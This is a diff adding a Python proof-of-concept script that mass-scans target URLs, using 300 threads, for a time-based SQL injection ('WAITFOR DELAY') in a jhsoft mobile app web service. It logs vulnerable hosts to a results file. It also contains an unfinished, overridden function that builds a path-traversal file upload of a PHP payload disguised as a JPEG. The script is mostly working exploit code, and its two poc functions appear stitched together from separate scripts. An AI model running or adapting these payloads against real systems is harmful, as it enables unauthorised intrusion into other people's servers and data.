@@ -1,0 +1,67 @@
+import requests,argparse,time,sys
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings() # 解除警告
+GREEN = '\033[92m'
+RESET = '\033[0m'
+def banner():
+	banner = """
+  __   __   __  ___   __  _  _   _ _   _ 
+ / / _ \ \ /  \/ / | /  \| || | | | | | |
+| |_/ \_| ( ()  <| || || ) || |_| | |_| |
+	"""
+	print(banner)
+def poc(target):
+	payload_url = "/ddi/server/fileupload.php?uploadDir=../../321&name=123.php"
+	url = target + payload_url
+	headers={
+		"Accept": "text/plain, */*; q=0.01",
+		"Content-Disposition": 'form-data; name="file"; filename="111.php"',
+		"Content-Type": "image/jpeg"
+	}	
+	data = "<?php phpinfo();?>"
+
+def poc(target):
+    url = target + "/c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1%27%3b+WAITFOR%20DELAY%20%270:0:5%27-- "
+    print(url)
+    headers={
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Connection": "close",
+    }
+    try:
+        res = requests.get(url=url,headers=headers,verify=False,timeout=8)
+        res2= res.elapsed.total_seconds()
+        print(res2)
+        if res2 >5 and res2 <6 :
+                   with open(r'./results.txt','a+') as f1:
+                        f1.write(f'{url}\n')
+                        print('[++++]'+target+'存在sql延时注入漏洞')
+                        return True
+        else:
+             print('[-]不存在sql延时注入漏洞')
+    except:
+         print(f'[*]{target}'' is server error')
+         return False
+
+def main():
+	banner()
+	parser = argparse.ArgumentParser()
+	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
+	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
+	args = parser.parse_args()
+	if args.url and not args.file:
+		poc(args.url)
+	elif args.file and not args.url:
+		url_list = []
+		with open(args.file,"r",encoding="utf-8") as f:
+			for i in f.readlines():
+				url_list.append(i.strip().replace("\n",""))
+		mp = Pool(300)
+		mp.map(poc,url_list)
+		mp.close()
+		mp.join()
+	else:
+		print(f"\n\tUage:python {sys.argv[0]} -h")
+
+
+if __name__ == "__main__":
+	main()
